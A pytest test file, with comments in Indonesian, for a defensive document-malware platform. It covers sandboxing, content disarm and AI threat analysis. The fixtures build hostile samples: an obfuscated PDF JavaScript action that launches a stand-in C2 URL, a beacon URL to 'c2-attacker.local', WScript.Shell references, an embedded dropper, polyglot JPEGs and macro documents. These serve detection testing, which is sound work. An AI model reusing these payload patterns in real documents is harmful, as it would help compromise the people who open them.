    assert "DOKUMEN UMPAN PLASEBO SATUAN (DECOY_SATUAN)" in sim_data["sandbox_execution"]["stdout"]
    assert sim_data["attacker_view"]["container_id"] == sim_data["sandbox_execution"]["container_id"]


def test_step_by_step_interactive_investigation_and_live_container(isolated_client):
    """
    Uji alur investigasi nyata 5 tahap (/api/range/...):
    1. /api/range/start -> mengekstrak header hex & SHA-256 tanpa langsung selesai.
    2. /step/audit -> mendeteksi anomali struktural nyata.
    3. /step/sandbox + /sandbox/exec -> menjalankan container nyata & menolak tulis/network.
    4. /step/ai-analyze -> menjalankan 3-Tahap AI Analyst & ABLE Validation Gate.
    5. /step/immunize -> menutup container, mengunci Ledger, menerbitkan vaksin, & memverifikasi blokir ulang.
    """
    client, _ledger, _sandbox, _ = isolated_client

    # Tahap 1: Kirim Dokumen
    r1 = client.post("/api/range/start", json={"cve_id": "JPEG-POLYGLOT", "protection_mode": "WITH_KERTOPATI"})
    assert r1.status_code == 200
    d1 = r1.json()
    inv_id = d1["inv_id"]
    assert d1["current_step"] == 1
    assert d1["artifact"]["header_hex"].startswith("FF D8 FF")

    # Tahap 2: Audit Struktural
    r2 = client.post(f"/api/range/{inv_id}/step/audit")
    assert r2.status_code == 200
    d2 = r2.json()
    assert d2["current_step"] == 2
    assert d2["audit"]["verdict"] == "INFECTED"

    # Tahap 3: Sandbox Nyata + Eksekusi Perintah Interaktif
    r3 = client.post(f"/api/range/{inv_id}/step/sandbox")
    assert r3.status_code == 200
    d3 = r3.json()
    assert d3["current_step"] == 3
    sbx = d3["sandbox_session"]
    assert sbx["active"] is True
    assert "rencana_operasi_palsu.txt" in sbx["decoy_files"]

    # Uji membaca file umpan di dalam container nyata
    rx_cat = client.post(f"/api/range/{inv_id}/sandbox/exec", json={"command": "cat /decoy_satuan/rencana_operasi_palsu.txt"})
    assert rx_cat.status_code == 200
    assert rx_cat.json()["result"]["exit_code"] == 0
    assert "DOKUMEN UMPAN PLASEBO SATUAN" in rx_cat.json()["result"]["stdout"]

    # Uji isolasi read-only (harus gagal menulis) & network=none (harus gagal ping)
    rx_ro = client.post(f"/api/range/{inv_id}/sandbox/exec", json={"command": "touch /decoy_satuan/hacked.txt"})
    assert rx_ro.status_code == 200
    assert rx_ro.json()["result"]["exit_code"] != 0

    rx_net = client.post(f"/api/range/{inv_id}/sandbox/exec", json={"command": "ping -c 1 8.8.8.8"})
    assert rx_net.status_code == 200
    assert rx_net.json()["result"]["exit_code"] != 0

    # Uji X-Ray langsung pada Tahap 3 sebelum imunisasi selesai
    rx_xray = client.get(f"/api/xray/{d3['sha256_prefix']}")
    assert rx_xray.status_code == 200
    assert rx_xray.json()["xray_type"] == "IMAGE_POLYGLOT"

    # Tahap 4: AI Threat Analyst 3-Tahap
    r4 = client.post(f"/api/range/{inv_id}/step/ai-analyze")
    assert r4.status_code == 200
    d4 = r4.json()
    assert d4["current_step"] == 4
    assert any("$client = test" in item["decoded"] for item in d4["stage1_pre_triage"]["decoded_base64"])
    assert "detection:" in d4["stage2_ai_synthesis"]["sigma_network_rule"]
    assert d4["stage3_able_validation"]["validation_status"].startswith("VALIDATED")

    # Tahap 5: Terbitkan Vaksin, Kunci Ledger & Verifikasi Re-Attack
    r5 = client.post(f"/api/range/{inv_id}/step/immunize")
    assert r5.status_code == 200
    d5 = r5.json()
    assert d5["current_step"] == 5
    assert d5["server_status"] == "SANDBOXED_IMMUNIZED"
    assert "touch /decoy_satuan/hacked.txt" in d5["honeypot_commands_captured"]
    assert "ping -c 1 8.8.8.8" in d5["honeypot_commands_captured"]
    assert d5["immunity_verification"]["blocked_by_vaccine"] is True
    assert d5["immunity_verification"]["retest_verdict"] == "INFECTED"


def test_realistic_demo_artifacts_visual_and_cdr_preservation(tmp_path):
    """Memastikan file demo PDF, JPEG, DOCX, dan CVE simulator berisi konten visual nyata yang utuh pasca-CDR."""
    import zipfile

    from PIL import Image
    from pypdf import PdfReader

    from app.simulator import build_cve_sample
    from demo_scripts.generate_multiformat_demos import build_clean_docx, build_clean_jpeg

    # 1. PDF Surat Dinas TNI AD realistis (>10 KB) & tetap utuh pasca-CDR
    clean_pdf = tmp_path / "surat_dinas_bsre_bersih.pdf"
    build_clean_signed_pdf(clean_pdf)
    pdf_bytes = clean_pdf.read_bytes()
    assert len(pdf_bytes) > 10_000
    assert inspect_pdf_bytes(pdf_bytes, "surat_dinas_bsre_bersih.pdf").verdict == "CLEAN"

    cdr_pdf = sanitize_pdf_bytes(pdf_bytes, "surat_dinas_bsre_bersih.pdf", output_dir=tmp_path)
    assert len(cdr_pdf.sanitized_bytes) > 10_000
    assert len(PdfReader(io.BytesIO(cdr_pdf.sanitized_bytes)).pages) == 1

    # 2. JPEG Peta Situasi Taktis (900x540), EXIF + polyglot tersapu bersih tanpa rusak resolusi
    clean_jpg = tmp_path / "laporan_lapangan_bersih.jpg"
    build_clean_jpeg(clean_jpg, with_exif=True)
    with Image.open(clean_jpg) as img_clean:
        assert img_clean.size == (900, 540)
        assert len(img_clean.getexif()) > 0

    poly_jpg = tmp_path / "laporan_lapangan_polyglot.jpg"
    build_polyglot_jpeg(poly_jpg)
    cdr_jpg = sanitize_image_bytes(poly_jpg.read_bytes(), "laporan_lapangan_polyglot.jpg", output_dir=tmp_path)
    with Image.open(io.BytesIO(cdr_jpg.sanitized_bytes)) as img_sanitized:
        assert img_sanitized.size == (900, 540)
        assert len(img_sanitized.getexif()) == 0
    assert b"PK\x03\x04" not in cdr_jpg.sanitized_bytes

    # 3. DOCX Rekapitulasi Logistik & Tabel Satuan utuh pasca-CDR Office tanpa vbaProject.bin
    clean_docx = tmp_path / "rekap_anggaran_bersih.docx"
    build_clean_docx(clean_docx)
    with zipfile.ZipFile(clean_docx, "r") as zf_clean:
        doc_xml = zf_clean.read("word/document.xml").decode("utf-8")
        assert "REKAPITULASI LOGISTIK" in doc_xml
        assert "Korem 061/Suryakencana" in doc_xml
        assert "<w:tbl>" in doc_xml

    macro_docx = tmp_path / "rekap_anggaran_macro.docx"
    build_macro_docx(macro_docx)
    cdr_docx = sanitize_office_bytes(macro_docx.read_bytes(), "rekap_anggaran_macro.docx", output_dir=tmp_path)
    with zipfile.ZipFile(io.BytesIO(cdr_docx.sanitized_bytes), "r") as zf_cdr:
        names = zf_cdr.namelist()
        assert "word/vbaProject.bin" not in names
        sanitized_xml = zf_cdr.read("word/document.xml").decode("utf-8")
        assert "REKAPITULASI LOGISTIK" in sanitized_xml
        assert "<w:tbl>" in sanitized_xml

    # 4. Sampel CVE inline di simulator juga memakai halaman PDF terender nyata (>10 KB)
    for cve_id, expected_marker in [
        ("CVE-2026-6361", b"CVE_2026_6361_PDFIUM_EXPLOIT"),
        ("CVE-2025-59802", b"HiddenCommandLayer_CVE_2025_59802"),
    ]:
        _, sample_bytes, _ = build_cve_sample(cve_id)
        assert len(sample_bytes) > 10_000
        assert expected_marker in sample_bytes


def test_interactive_docker_terminal_cd_ls_upload_and_vulnerable_mode(isolated_client, tmp_path, monkeypatch):
    """
    Menguji alur game hacker mulai dari kirim/unggah dokumen -> terminal Linux stateful (cd, ls, pwd):
    1. Upload dokumen custom ke /api/range/start-upload (WITH_KERTOPATI) -> Docker container + docker inspect proof.
    2. Stateful `cd /tmp` -> `pwd` == /tmp -> `cd /decoy_satuan` -> `ls` berisi file umpan & file unggahan.
    3. Mode WITHOUT_KERTOPATI -> /step/audit otomatis membuka container target rentan (`root@/srv/eoffice`) bisa `cd rahasia` & `cat`.
    4. Fallback lokal juga mendukung `cd`, `pwd`, dan `ls` secara konsisten saat Docker dimock nonaktif.
    """
    from app import real_sandbox

    client, _ledger, _sandbox, _ = isolated_client

    # 1. Alur mulai dari Unggah Dokumen Custom -> Audit -> Live Docker Terminal
    poly_jpg = tmp_path / "misi_custom.jpg"
    build_polyglot_jpeg(poly_jpg)
    r_up = client.post(
        "/api/range/start-upload",
        data={"protection_mode": "WITH_KERTOPATI"},
        files={"file": ("misi_custom.jpg", poly_jpg.read_bytes(), "image/jpeg")},
    )
    assert r_up.status_code == 200
    inv_id = r_up.json()["inv_id"]
    assert r_up.json()["artifact"]["filename"] == "misi_custom.jpg"

    r_aud = client.post(f"/api/range/{inv_id}/step/audit")
    assert r_aud.status_code == 200
    assert r_aud.json()["audit"]["verdict"] == "INFECTED"

    r_sbx = client.post(f"/api/range/{inv_id}/step/sandbox")
    assert r_sbx.status_code == 200
    sbx = r_sbx.json()["sandbox_session"]
    sbx_sid = sbx["session_id"]
    vuln_sid = None
    try:
        assert sbx["cwd"] == "/decoy_satuan"
        assert sbx["prompt_user"] == "nobody"

        # Cek bukti nyata Docker status endpoint (/sandbox/status)
        r_st = client.get(f"/api/range/{inv_id}/sandbox/status")
        assert r_st.status_code == 200
        st_json = r_st.json()
        if sbx["backend_kind"] == "docker":
            assert st_json["docker_proof"]["is_docker"] is True
            assert st_json["docker_proof"]["running"] is True
            assert st_json["docker_proof"]["container_pid"]

        # Uji perintah Linux stateful: `cd /tmp` -> `pwd` -> `cd /decoy_satuan` -> `ls`
        r_cd_tmp = client.post(f"/api/range/{inv_id}/sandbox/exec", json={"command": "cd /tmp"})
        assert r_cd_tmp.status_code == 200
        assert r_cd_tmp.json()["cwd"] == "/tmp"

        r_pwd = client.post(f"/api/range/{inv_id}/sandbox/exec", json={"command": "pwd"})
        assert r_pwd.status_code == 200
        assert r_pwd.json()["result"]["stdout"].strip() == "/tmp"

        r_cd_decoy = client.post(f"/api/range/{inv_id}/sandbox/exec", json={"command": "cd /decoy_satuan"})
        assert r_cd_decoy.status_code == 200
        assert r_cd_decoy.json()["cwd"] == "/decoy_satuan"

        r_ls = client.post(f"/api/range/{inv_id}/sandbox/exec", json={"command": "ls"})
        assert r_ls.status_code == 200
        ls_out = r_ls.json()["result"]["stdout"]
        assert "rencana_operasi_palsu.txt" in ls_out
        assert "misi_custom.jpg" in ls_out

        # 2. Mode WITHOUT_KERTOPATI -> /step/audit membuka container target rentan (root@/srv/eoffice)
        r_v1 = client.post("/api/range/start", json={"cve_id": "CVE-2026-91814", "protection_mode": "WITHOUT_KERTOPATI"})
        assert r_v1.status_code == 200
        v_id = r_v1.json()["inv_id"]

        r_v2 = client.post(f"/api/range/{v_id}/step/audit")
        assert r_v2.status_code == 200
        v2_data = r_v2.json()
        vuln_sid = v2_data["sandbox_session"]["session_id"]
        assert v2_data["vulnerable_terminal_ready"] is True
        assert v2_data["sandbox_session"]["mode"] == "vulnerable"
        assert v2_data["sandbox_session"]["prompt_user"] == "root"
        assert v2_data["sandbox_session"]["cwd"] == "/srv/eoffice"

        r_v_cd = client.post(f"/api/range/{v_id}/sandbox/exec", json={"command": "cd rahasia"})
        assert r_v_cd.status_code == 200
        assert r_v_cd.json()["cwd"] == "/srv/eoffice/rahasia"

        r_v_cat = client.post(f"/api/range/{v_id}/sandbox/exec", json={"command": "cat rencana_operasi_satuan.txt"})
        assert r_v_cat.status_code == 200
        assert "CRITICAL LEAK" in r_v_cat.json()["result"]["stdout"]
    finally:
        real_sandbox.close_sandbox_session(sbx_sid)
        if vuln_sid:
            real_sandbox.close_sandbox_session(vuln_sid)

    # 3. Uji fallback lokal tanpa Docker juga mendukung stateful cd & ls
    monkeypatch.setattr(real_sandbox, "_check_docker_available", lambda: None)
    local_sess = real_sandbox.create_sandbox_session(poly_jpg.read_bytes(), "fallback.jpg", "JPEG-POLYGLOT")
    try:
        assert local_sess["backend_kind"] == "local"
        c1 = real_sandbox.exec_sandbox_command(local_sess["session_id"], "cd /tmp")
        assert c1["exit_code"] == 0 and c1["cwd"] == "/tmp"
        c2 = real_sandbox.exec_sandbox_command(local_sess["session_id"], "pwd")
        assert c2["stdout"] == "/tmp"
        c3 = real_sandbox.exec_sandbox_command(local_sess["session_id"], "cd /decoy_satuan")
        assert c3["cwd"] == "/decoy_satuan"
        c4 = real_sandbox.exec_sandbox_command(local_sess["session_id"], "ls")
        assert "rencana_operasi_palsu.txt" in c4["stdout"]
    finally:
        real_sandbox.close_sandbox_session(local_sess["session_id"])


def test_pdf_malware_deep_extractor_deobfuscation_entropy_and_ai_integration(isolated_client, tmp_path):
    """
    Memverifikasi modul deep_analyze_pdf_malware() & integrasi AI Analyst:
    a) Mengekstrak isi aktual /JS + /OpenAction + /EmbeddedFiles dan mendekode String.fromCharCode / unescape / hex concat.
    b) Menghitung Shannon Entropy (termasuk deteksi stream packed > 6.5) dan risk_score objektif (PDF terinfeksi > PDF bersih).
    c) /api/upload menyimpan risk_score, shannon_entropy, detected_apis, extracted_script_preview, & deobfuscated_script ke AI Intel & UI.
    """
    from app.pdf_malware_analyzer import deep_analyze_pdf_malware

    client, _ledger, test_sandbox, _ = isolated_client

    # 1. PDF Bersih harus memiliki risk_score rendah dan tanpa script berbahaya
    clean_pdf = tmp_path / "clean_baseline.pdf"
    build_clean_signed_pdf(clean_pdf)
    clean_res = deep_analyze_pdf_malware(clean_pdf.read_bytes())
    assert clean_res["is_pdf"] is True
    assert clean_res["byterange_status"] == "VALID"
    assert clean_res["detected_apis"] == []
    assert clean_res["risk_score"] <= 15

    # 2. PDF dengan obfuskasi String.fromCharCode + unescape('%u0061...') + concat + /EmbeddedFile + packed stream
    writer = PdfWriter()
    writer.add_blank_page(300, 300)
    buf = io.BytesIO()
    writer.write(buf)
    base_pdf = buf.getvalue()

    unescaped_tail = (
        b"\n71 0 obj\n<< /Type /Filespec /F (dropper_x86.exe) >>\nendobj\n"
        b"72 0 obj\n<< /Length 2048 >>\nstream\n"
        + bytes((i * 73 + 19) % 256 for i in range(2048))
        + b"\nendstream\nendobj\n"
        b"73 0 obj\n<< /Type /Action /S /JavaScript /OpenAction true "
        b"/JS (var fn = 'ev' + 'al'; unescape('%61%70%70%2e%6c%61%75%6e%63%68%55%52%4c%28%22%68%74%74%70%3a%2f%2f%63%32%2e%65%76%69%6c%2f%70%22%29'); util.printf('%s', '\\x41\\x42')) >>\nendobj\n"
        b"%%EOF\n"
    )
    deep_unescape = deep_analyze_pdf_malware(base_pdf + unescaped_tail)
    assert "unescape" in deep_unescape["obfuscation_layers"]
    assert "string_concat" in deep_unescape["obfuscation_layers"]
    assert "hex_escape" in deep_unescape["obfuscation_layers"]
    assert "app.launchURL" in deep_unescape["detected_apis"]
    assert "util.printf" in deep_unescape["detected_apis"]
    assert "dropper_x86.exe" in deep_unescape["embedded_files"]
    assert deep_unescape["shannon_entropy"] > 6.5
    assert deep_unescape["entropy_packing_suspect"] is True
    assert deep_unescape["risk_score"] > clean_res["risk_score"] + 40

    # 3. Demo evil PDF (String.fromCharCode) melalui upload API -> terdecode dan tampil di UI
    evil_pdf = tmp_path / "surat_evil_fromcharcode.pdf"
    build_infected_shadow_pdf(evil_pdf)
    evil_raw = evil_pdf.read_bytes()

    deep_evil = deep_analyze_pdf_malware(evil_raw)
    assert "String.fromCharCode" in deep_evil["obfuscation_layers"]
    assert "http://c2-attacker.local/beacon" in deep_evil["deobfuscated_script"]
    assert "app.alert" in deep_evil["detected_apis"]
    assert "WScript.Shell" in deep_evil["detected_apis"]
    assert "eval(" in deep_evil["detected_apis"]
    assert deep_evil["risk_score"] > clean_res["risk_score"]

    resp = client.post(
        "/api/upload",
        files={"file": ("surat_evil_fromcharcode.pdf", evil_raw, "application/pdf")},
    )
    assert resp.status_code == 200
    ai = resp.json()["soc_view"]["sandbox_event"]["ai_analysis"]
    assert ai["risk_score"] == deep_evil["risk_score"]
    assert ai["shannon_entropy"] == deep_evil["shannon_entropy"]
    assert "app.alert" in ai["detected_apis"]
    assert "String.fromCharCode" in ai["extracted_script_preview"]
    assert "http://c2-attacker.local/beacon" in ai["deobfuscated_script"]
    assert len(test_sandbox.get_active_vaccines()) == 1

    html = client.get("/").text
    assert f"Risk Score: {ai['risk_score']}/100" in html
    assert f"Entropy: {ai['shannon_entropy']:.2f}" in html
    assert "Extracted &amp; Deobfuscated PDF Script" in html


def test_gemini_retry_on_timeout_up_to_10_then_offline_fallback(monkeypatch, tmp_path):
    """Memverifikasi panggilan langsung Gemini API retry maks 10x saat timeout sebelum fallback ke Offline Engine."""
    import json
    import urllib.request
    from app import ai_analyst

    monkeypatch.setenv("GEMINI_API_KEY", "dummy-test-key")
    monkeypatch.setenv("GEMINI_MODEL", "gemini-flash-lite-latest")
    monkeypatch.setattr(ai_analyst.time, "sleep", lambda _s: None)

    evil_pdf = tmp_path / "retry_evil.pdf"
    build_infected_shadow_pdf(evil_pdf)
    evil_raw = evil_pdf.read_bytes()

    # 1. Timeout 3x lalu sukses di percobaan ke-4 -> memakai respons Gemini
    attempts_ok = {"count": 0}

    class _MockResp:
        def __init__(self, payload: dict):
            self._data = json.dumps(payload).encode("utf-8")

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def read(self):
            return self._data

    class _OpenerRecover:
        def open(self, req, timeout=6.0):
            attempts_ok["count"] += 1
            if attempts_ok["count"] <= 3:
                raise TimeoutError("timed out")
            return _MockResp(
                {"candidates": [{"content": {"parts": [{"text": "Ringkasan Gemini setelah retry."}]}}]}
            )

    monkeypatch.setattr(urllib.request, "build_opener", lambda *a, **kw: _OpenerRecover())
    res_ok = ai_analyst.analyze_threat_and_synthesize_vaccine(
        filename="retry_evil.pdf",
        raw_bytes=evil_raw,
        source_unit="Kodim 0606",
        file_format="PDF",
        inspection_reasons=["Shadow Attack"],
        dangerous_tags=["/JS", "/OpenAction"],
    )
    assert attempts_ok["count"] == 4
    assert res_ok["ai_analysis"]["analysis_mode"] == "Gemini AI (gemini-flash-lite-latest)"
    assert "Ringkasan Gemini setelah retry." in res_ok["ai_analysis"]["commander_brief"]

    # 2. Timeout terus 10x -> berhenti di 10x & fallback ke Offline Evidence-Based Engine
    attempts_fail = {"count": 0}

    class _OpenerAlwaysTimeout:
        def open(self, req, timeout=6.0):
            attempts_fail["count"] += 1
            raise TimeoutError("timed out")

    monkeypatch.setattr(urllib.request, "build_opener", lambda *a, **kw: _OpenerAlwaysTimeout())
    res_fallback = ai_analyst.analyze_threat_and_synthesize_vaccine(
        filename="retry_evil.pdf",
        raw_bytes=evil_raw,
        source_unit="Kodim 0606",
        file_format="PDF",
        inspection_reasons=["Shadow Attack"],
        dangerous_tags=["/JS", "/OpenAction"],
    )
    assert attempts_fail["count"] == 10
    assert res_fallback["ai_analysis"]["analysis_mode"] == "Kertopati AI Evidence Engine (Offline)"
    assert "Risk Score" in res_fallback["ai_analysis"]["commander_brief"]








